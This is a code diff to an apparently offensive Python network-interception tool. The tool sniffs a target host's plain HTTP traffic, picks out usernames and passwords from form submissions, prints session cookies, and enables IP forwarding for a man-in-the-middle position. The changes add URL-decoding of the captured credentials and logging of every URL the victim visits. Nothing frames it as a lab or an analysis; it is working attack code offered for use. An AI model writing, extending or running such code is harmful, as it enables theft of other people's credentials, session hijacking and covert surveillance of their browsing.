@@ -12,6 +12,7 @@ import ctypes
 import subprocess
 import requests
 import re
+import urllib.parse
 
 # Check platform and privileges
 if platform.system() == "Windows":
@@ -70,20 +71,20 @@ class Device:
                 if "POST" in raw_data or "GET" in raw_data:
                     login_data = None
                     password_data = None
-                    
+
                     # Detect login (username, email, phone, user_id, pseudonym)
                     if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email', 'phone', 'user_id', 'pseudonym']):
                         for line in raw_data.split('\r\n'):
                             if '=' in line and len(line) < 100:
                                 if any(k in line.lower() for k in ['username', 'user', 'login', 'email', 'user_id', 'pseudonym', 'phone']):
-                                    login_data = line.split('=')[1]
+                                    login_data = urllib.parse.unquote(line.split('=')[1])  # Decode URL-encoded string
 
                     # Detect password (pwd, passwd, heslo)
                     if any(k in raw_data.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
                         for line in raw_data.split('\r\n'):
                             if '=' in line and len(line) < 100:
                                 if any(k in line.lower() for k in ['password', 'pass', 'pwd', 'heslo']):
-                                    password_data = line.split('=')[1]
+                                    password_data = urllib.parse.unquote(line.split('=')[1])  # Decode URL-encoded string
                     
                     # If credentials found, print them
                     if login_data and password_data:
@@ -91,12 +92,24 @@ class Device:
                         print(f"{Fore.GREEN}    Login: {login_data}{Style.RESET_ALL}")
                         print(f"{Fore.GREEN}    PWD: {password_data}{Style.RESET_ALL}")
 
+                    # Print Visited URL
+                    if "GET" in raw_data and "Host:" in raw_data:
+                        try:
+                            host = raw_data.split("Host: ")[1].split("\r\n")[0]
+                            path = raw_data.split("GET ")[1].split(" HTTP")[0]
+                            url = f"http://{host}{path}"
+                            print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
+                        except Exception:
+                            pass
+
+                    # Print captured cookies
                     if "Set-Cookie:" in raw_data:
                         cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
                         print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
 
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
+
 
     def enable_ip_forwarding(self):
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
